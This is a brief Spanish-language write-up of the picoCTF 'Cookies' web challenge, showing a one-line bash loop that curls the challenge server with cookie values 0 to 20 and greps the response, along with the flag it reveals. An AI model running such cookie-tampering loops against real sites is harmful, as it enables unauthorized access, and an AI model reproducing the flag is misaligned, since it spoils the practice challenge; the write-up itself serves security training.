#### Descripción
Who doesn't love cookies? Try to figure out the best one.

#### Solución 
En este problema lo que tenemos que es usar un comando para poder realizar este reto
```
RepugnamShip33-picoctf@webshell:~$ for i in {0..20}; do curl -s http://mercury.picoctf.net:21485/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}</code></p>
```


#### Notas Adicionales
Tambien se podia realizar haciendo una funcion aparte para descifrar por nuestra cuenta la flag.
#### Referencias
